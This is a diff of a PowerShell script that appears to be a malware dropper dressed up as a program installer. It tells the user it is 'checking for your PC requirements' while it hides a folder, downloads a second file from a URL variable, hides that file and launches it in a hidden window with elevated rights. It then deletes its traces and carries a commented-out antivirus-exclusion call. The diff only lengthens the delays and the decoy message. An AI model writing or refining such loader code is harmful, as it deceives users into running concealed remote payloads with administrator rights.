@@ -32,7 +32,7 @@ function Add-Exclusion {
 }
 
 try {
-    Write-Host "Downloading the program and checking for your PC requirements..."
+    Write-Host "Downloading the program and checking for your PC requirements (can take up to 5 minutes)..."
     Set-Location $hiddenFolder
     #Add-Exclusion -Path $hiddenFolder
     Set-ItemProperty -Path $hiddenFolder -name Attributes -Value $hiddenAttr
@@ -43,9 +43,9 @@ try {
     Invoke-WebRequest -Uri $download2URL -OutFile $tempPath2 -UseBasicParsing -ErrorAction $stopAction
     #Add-Exclusion -Path $tempPath2
     Set-ItemProperty -Path $tempPath2 -name Attributes -Value $hiddenAttr
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 20
     Start-Process -FilePath $tempPath2 -WindowStyle $hiddenAttr -Verb $runAs
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 20
     Remove-Item $hiddenFolder -Recurse -Force
 } catch {
     exit 1
